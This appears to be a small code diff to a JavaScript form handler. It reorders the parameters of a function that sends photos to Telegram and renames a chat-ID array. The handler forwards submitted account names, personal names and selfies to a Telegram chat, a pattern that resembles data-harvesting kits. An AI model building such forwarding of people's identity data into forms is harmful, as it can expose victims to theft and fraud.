@@ -67,7 +67,7 @@ async function sendTextToTelegram(text, CHAT_ID) {
 }
 
 // Function to send photo to Telegram
-async function sendPhotoToTelegram(photoPath, caption = '', CHAT_ID) {
+async function sendPhotoToTelegram(CHAT_ID, photoPath, caption = '') {
     try {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -136,7 +136,7 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
        
     // Format text data for Telegram   
     const formattedText = lines.join('\n').trim();
-    const Chat_Ids = [TELEGRAM_CHAT_ID];
+    const Ids = [TELEGRAM_CHAT_ID];
     
 
         // Send text data to Telegram
@@ -151,7 +151,7 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
         if (selfieFile) {
             const Ids = [TELEGRAM_CHAT_ID];
             const caption = `📸 Selfie from: ${name}`;
-          sendPhotoToTelegram(selfieFile.path, caption, Ids);
+          sendPhotoToTelegram(Ids, selfieFile.path, caption);
         }
 });
 
